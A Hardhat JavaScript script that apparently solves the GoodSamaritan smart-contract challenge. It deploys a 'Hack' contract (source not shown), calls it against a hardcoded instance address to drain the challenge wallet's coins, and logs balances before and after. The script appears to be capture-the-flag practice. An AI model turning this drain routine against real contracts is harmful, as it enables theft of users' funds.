const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const GoodSamaritan = await ethers.getContractFactory("GoodSamaritan");
    const Wallet = await ethers.getContractFactory("Wallet");
    const Coin = await ethers.getContractFactory("Coin");
    const Hack = await ethers.getContractFactory("Hack");

    // Deploy the Hack contract
    const hack = await Hack.deploy();
    await hack.deployed();

    const good_samaritan = GoodSamaritan.attach(instance_address);

    const wallet = Wallet.attach(await good_samaritan.wallet());
    const coin = Coin.attach(await good_samaritan.coin());

    console.log(`Wallet: ${wallet.address}`);
    console.log(`Coin: ${coin.address}`);

    console.log(`Wallet Balance: ${await coin.balances(wallet.address)}`);
    console.log(`Attacker Balance: ${await coin.balances(account.address)}`);
    console.log(`Hack Balance: ${await coin.balances(hack.address)}`);

    console.log("Hacking...");
    let tx = await hack.hack(good_samaritan.address);
    await tx.wait(5);

    console.log(`Wallet Balance: ${await coin.balances(wallet.address)}`);
    console.log(`Attacker Balance: ${await coin.balances(account.address)}`);
    console.log(`Hack Balance: ${await coin.balances(hack.address)}`);

    console.log("Sucess!!");

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x7aCf4293CcC62146b506AF43feD86901a4E3Cb77';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
